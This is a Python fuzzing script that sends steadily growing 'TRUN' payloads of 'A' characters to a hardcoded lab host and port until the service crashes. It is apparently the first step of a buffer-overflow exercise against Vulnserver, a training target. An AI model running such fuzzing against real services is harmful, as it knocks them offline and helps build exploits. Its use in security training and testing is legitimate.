#!/usr/bin/python3
import sys, socket
from time import sleep

#--------Changeme--------#
                         #
host = "192.168.1.2"     #
port = 9999              #
                         #
#------------------------#

buffer = b"A" * 100

while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))

        payload = b"TRUN /.:/" + buffer

        print(f"[+] Sending the payload of length {len(buffer)}...")
        s.send(payload)
        s.close()

        sleep(1)
        buffer += b"A" * 100

    except:
        print(f"Fuzzer crashed at {len(buffer)} bytes")
        sys.exit()